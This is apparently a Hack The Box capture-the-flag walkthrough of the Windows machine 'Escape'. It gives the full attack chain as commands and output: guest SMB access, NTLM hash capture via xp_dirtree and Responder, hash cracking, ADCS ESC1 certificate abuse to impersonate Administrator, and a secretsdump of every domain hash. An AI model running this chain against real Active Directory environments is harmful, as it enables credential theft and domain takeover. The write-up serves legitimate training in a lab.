---
description: Windows Medium Box
---

# HTB Escape

We begin by starting scanning for open ports using nmap. Port 88 showing Active Directory Kerberos running. In case of boxes this is usually straight aways the domain controller or DC01.

```bash
➜  ~ sudo nmap -sV -sC -T4 -p- 10.129.116.221
[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 19:02 CEST
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 63.69% done; ETC: 19:04 (0:00:43 remaining)
Nmap scan report for 10.129.116.221
Host is up (0.012s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-03 01:04:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-06-03T01:05:46+00:00; +8h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-06-03T01:05:46+00:00; +8h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.116.221:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-06-03T01:01:53
|_Not valid after:  2055-06-03T01:01:53
| ms-sql-ntlm-info:
|   10.129.116.221:1433:
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-06-03T01:05:46+00:00; +8h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-06-03T01:05:46+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-03T01:05:46+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-03T01:05:06
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.11 seconds

```

From this scan we find several interesting things

* Port 88 running kerberos
* Port 389: We domain and dc name: dc.sequel.htb and sequel.htb
* Port 445: SMB share, check for guest and anonymous access.
* Port 1443: MSSQL database running, interesting for foothold or priv esc

### <mark style="color:blue;">SMB Share</mark>

Checking guest access in the smb share we find to have read access in the Public share.

```bash
➜  ~ nxc smb 10.129.116.221 -u "Guest" -p "" --shares
SMB         10.129.116.221  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.116.221  445    DC               [+] sequel.htb\Guest:
SMB         10.129.116.221  445    DC               [*] Enumerated shares
SMB         10.129.116.221  445    DC               Share           Permissions     Remark
SMB         10.129.116.221  445    DC               -----           -----------     ------
SMB         10.129.116.221  445    DC               ADMIN$                          Remote Admin
SMB         10.129.116.221  445    DC               C$                              Default share
SMB         10.129.116.221  445    DC               IPC$            READ            Remote IPC
SMB         10.129.116.221  445    DC               NETLOGON                        Logon server share
SMB         10.129.116.221  445    DC               Public          READ
SMB         10.129.116.221  445    DC               SYSVOL                          Logon server share
```

Loggin into the Public share we find a .pdf

```bash
➜  ~ smbclient.py guest@10.129.116.221
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Public
SYSVOL
# use Public
# ls
drw-rw-rw-          0  Sat Nov 19 12:51:25 2022 .
drw-rw-rw-          0  Sat Nov 19 12:51:25 2022 ..
-rw-rw-rw-      49551  Sat Nov 19 12:51:25 2022 SQL Server Procedures.pdf
# get SQL Server Procedures.pdf
```

The contents of the .pdf write about accidents with the SQL Servers addressed at Ryan and mentions Tom and Brandon, potential username. We also find login credentials.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

In this case we have to login with SQL Server Authentiation instead of windows authentication. Using above credentials we can login into the database. We find xp\_dirtree is enabled. We can use this to capture the NTLMv2 hash of the user which runs the MSSQL service.

Start Responder

```bash
➜  ~ sudo responder -I tun0
```

<pre class="language-bash"><code class="lang-bash"><strong>➜  ~ mssqlclient.py PublicUser@10.129.116.221
</strong>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> help

SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.194\test
subdirectory   depth   file

</code></pre>

Wait for the hash to be captured after sending xp\_dirtree

```bash
➜  ~ sudo responder -I tun0
[sudo] password for kali:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.194]
    Responder IPv6             [dead:beef:2::10c0]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-PONJBCDDEME]
    Responder Domain Name      [X6S1.LOCAL]
    Responder DCE-RPC Port     [49675]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.116.221
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:c27c9d68bc0577d4:581C6C7EA13F898E186990C56873D49F:01010000000000008079E67AF3D3DB01DDDDC8E7950B77900000000002000800580036005300310001001E00570049004E002D0050004F004E004A00420043004400440045004D00450004003400570049004E002D0050004F004E004A00420043004400440045004D0045002E0058003600530031002E004C004F00430041004C000300140058003600530031002E004C004F00430041004C000500140058003600530031002E004C004F00430041004C00070008008079E67AF3D3DB0106000400020000000800300030000000000000000000000000300000E169CF2264D56074CF46649F10D1EDFA0EA78FC07B5B4903166F82F8301759E00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100390034000000000000000000

```

We capture the hash of the sql\_svc account and can crack it.

```bash
➜  ~ hashcat -m 5600 ~/hash ~/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 5700G with Radeon Graphics, 6568/13201 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /home/kali/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921509
* Keyspace..: 14344385

SQL_SVC::sequel:c27c9d68bc0577d4:581c6c7ea13f898e186990c56873d49f:01010000000000008079e67af3d3db01ddddc8e7950b77900000000002000800580036005300310001001e00570049004e002d0050004f004e004a00420043004400440045004d00450004003400570049004e002d0050004f004e004a00420043004400440045004d0045002e0058003600530031002e004c004f00430041004c000300140058003600530031002e004c004f00430041004c000500140058003600530031002e004c004f00430041004c00070008008079e67af3d3db0106000400020000000800300030000000000000000000000000300000e169cf2264d56074cf46649f10d1edfa0ea78fc07b5b4903166f82f8301759e00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100390034000000000000000000:<password>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:c27c9d68bc0577d4:581c6c7ea13f898e18...000000
Time.Started.....: Mon Jun  2 19:27:05 2025 (4 secs)
Time.Estimated...: Mon Jun  2 19:27:09 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kali/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3320.2 kH/s (1.42ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10706944/14344385 (74.64%)
Rejected.........: 0/10706944 (0.00%)
Restore.Point....: 10698752/14344385 (74.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REPIN210 -> RAHRYA
Hardware.Mon.#1..: Util: 37%

Started: Mon Jun  2 19:27:03 2025
Stopped: Mon Jun  2 19:27:10 2025

```

### <mark style="color:blue;">AD enumeration</mark>

Having valid credentials of the domain we want to enumerate several things. First we look for usernames using `--rid-brute` to include any users with higher rid's.

```bash
➜  ~ nxc smb 10.129.116.221 -u "sql_svc" -p "REGGIE1234ronnie" --rid-brute 6000
SMB         10.129.116.221  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.116.221  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie
SMB         10.129.116.221  445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.116.221  445    DC               500: sequel\Administrator (SidTypeUser)
SMB         10.129.116.221  445    DC               501: sequel\Guest (SidTypeUser)
SMB         10.129.116.221  445    DC               502: sequel\krbtgt (SidTypeUser)
SMB         10.129.116.221  445    DC               512: sequel\Domain Admins (SidTypeGroup)
SMB         10.129.116.221  445    DC               513: sequel\Domain Users (SidTypeGroup)
SMB         10.129.116.221  445    DC               514: sequel\Domain Guests (SidTypeGroup)
SMB         10.129.116.221  445    DC               515: sequel\Domain Computers (SidTypeGroup)
SMB         10.129.116.221  445    DC               516: sequel\Domain Controllers (SidTypeGroup)
SMB         10.129.116.221  445    DC               517: sequel\Cert Publishers (SidTypeAlias)
SMB         10.129.116.221  445    DC               518: sequel\Schema Admins (SidTypeGroup)
SMB         10.129.116.221  445    DC               519: sequel\Enterprise Admins (SidTypeGroup)
SMB         10.129.116.221  445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.116.221  445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.116.221  445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.116.221  445    DC               525: sequel\Protected Users (SidTypeGroup)
SMB         10.129.116.221  445    DC               526: sequel\Key Admins (SidTypeGroup)
SMB         10.129.116.221  445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.116.221  445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.116.221  445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.116.221  445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.116.221  445    DC               1000: sequel\DC$ (SidTypeUser)
SMB         10.129.116.221  445    DC               1101: sequel\DnsAdmins (SidTypeAlias)
SMB         10.129.116.221  445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.116.221  445    DC               1103: sequel\Tom.Henn (SidTypeUser)
SMB         10.129.116.221  445    DC               1104: sequel\Brandon.Brown (SidTypeUser)
SMB         10.129.116.221  445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)
SMB         10.129.116.221  445    DC               1106: sequel\sql_svc (SidTypeUser)
SMB         10.129.116.221  445    DC               1107: sequel\James.Roberts (SidTypeUser)
SMB         10.129.116.221  445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)
SMB         10.129.116.221  445    DC               1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
```

We find serveral usernames

* Tom.Henn
* Brandon.Brown
* Ryan.Cooper
* sql\_svc
* James.Roberts
* Nicole.Thompson

Next we dump the domain in bloodhound

```bash
➜  ~ bloodhound-ce-python -u sql_svc -p REGGIE1234ronnie -d sequel.htb -dc dc.sequel.htb -c All -ns 10.129.116.221
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sequel.htb
INFO: Done in 00M 02S
```

In meanwhile we also find Active Directory Ceriticate Services or ADCS running.

```bash
➜  ~ nxc smb 10.129.116.221 -u "sql_svc" -p "REGGIE1234ronnie" -M adcs
[-] Module ADCS is not supported for protocol smb
➜  ~ nxc ldap 10.129.116.221 -u "sql_svc" -p "REGGIE1234ronnie" -M adcs
LDAP        10.129.116.221  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.116.221  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie
ADCS        10.129.116.221  389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.116.221  389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        10.129.116.221  389    DC               Found CN: sequel-DC-CA
```

In bloodhound we see sql\_svc member of remote management so we can login on evil-winrm.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Looking for files and credentials we find a log file ERRORLOG.BAK in c:/SQLserver/logs. We see a failed login attempt for Ryan.Cooper with a password.

```powershell
*Evil-WinRM* PS C:\SQLserver\logs> type errorlog.bak

2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

Password spray shows the password is valid, logging in as Ryan.Cooper gives us user flag

```powershell
➜  ~ evil-winrm -i 10.129.116.221 -u Ryan.Cooper -p NuclearMosquito3

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> ls


    Directory: C:\Users\Ryan.Cooper\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/2/2025   6:02 PM             34 user.txt

```

### <mark style="color:blue;">Privilege Escalation for root flag.</mark>

Running certipy under the context of Ryan.Cooper we get output returned that the template UserAuthentication is vulnerable for ESC1.

```bash
➜  ~ certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.116.221 -dns-tcp -stdout -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

ECS! meaning we can allow a `subjectAltname`. We can do so by requesting a certificate and include the alternate subject like `-upn Administrator`.

We can find the CA name and template in the output of certipy. The CA name here is "sequel-DC-CA".

```bash
➜  ~ certipy-ad req -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.116.221 -ca sequel-DC-CA -template UserAuthentication -upn Administrator
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

We now have a .pfx container for administrator. With a .pfx file its possible to authenticate to the domain and retrieve a TGT and NT hash for administrator.

```bash
➜  ~ certipy-ad auth -pf administrator.pfx -username administrator -domain sequel.htb -dc-ip 10.129.116.221
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

We get a clock skew error, there's several options to fix this like rdate or ntpdate. What works for over longer periods of time.

```bash
➜  ~ faketime -f $(ntpdate -q 10.129.116.221 | awk '{print $4}') bash
```

Then running the command again we get the TGT and admin hash.

```bash
┌──(kali㉿kali)-[~]
└─$ certipy-ad auth -pf administrator.pfx -username administrator -domain sequel.htb -dc-ip 10.129.116.221
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751esdfsdfse9f3e58f4ee
```

Login for the root flag in `/users/administrator/desktop/root.txt` .

And finally dump the entiry domain

```bash
➜  ~ secretsdump.py administrator@dc.sequel.htb -hashes :a52f78e4c751e5f5e17e1e9f3e58f4ee
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cbf36a6101cb1a15esdfsdsf776ec6d5d77b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
sequel\DC$:aes256-cts-hmac-sha1-96:9290f280607a09f6dd56c89352c2259f0ad436f9f06396ddae0e68b6acb8d9e9
sequel\DC$:aes128-cts-hmac-sha1-96:0e1560a1c39112389c0edfd9e4e90e09
sequel\DC$:des-cbc-md5:e5da8fcde01a9d2a
sequel\DC$:plain_password_hex:d72056c033c5bcc075a223e5e17681e75148c7d64d1391bc93c21182262c6f3282180222ed508a81e3d3ac66b7f2d6cfa987f7095df6bace90f52983bc7b17c5cfad00405a10cd3d5d29223fc9253b97bf2d36c59cbe847f0c16551a1869b9e15777c855adcd10e816c7df920b5d4a3e4ac25d7bc20f80198ae50df0fce77a5d8cec5b355387cefec952e7a1ee25e3ca89cedd4efbddd40ca5409c5902d68f5dcf196dce543e84fe41cc9cadd61c29b785676f400e7846207b18e0d07ab615c2c0fbc279cf8236f52683c4589d5241c51ae8912eb3d569b5a476f8046fb3f93b2390f73736cd1923dd3584970a654b12
sequel\DC$:aad3b435b51404eeaad3b435b51404ee:f740902298d20f4be6f4ae896f4f8883:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] _SC_MSSQL$SQLMOCK
sequel\sql_svc:REGGIE1234ronnie
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c7sdfsde17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
Tom.Henn:1103:aad3b435b51404eeaad3b435b51404ee:22e99d2b3043bbb0a480705c9b0e71ac:::
Brandon.Brown:1104:aad3b435b51404eeaad3b435b51404ee:f562f509ad646c666f83b45f90a58af3:::
Ryan.Cooper:1105:aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945:::
sql_svc:1106:aad3b435b51404eeaad3b435b51404ee:1443ec19da4dac4ffc953bca1b57b4cf:::
James.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:cc69ea05e9ab430702679d5706b39075:::
Nicole.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:235da7fbef7d0861301b4078d56afdc5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:f740902298d20f4be6f4ae896f4f8883:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0ba0bb35571c5d0e19849c9c2b92539a4ce6a8fd3dd6348fb6a0888797dedd16
Administrator:aes128-cts-hmac-sha1-96:37cbf2133cdec2b7e5531957a21e791f
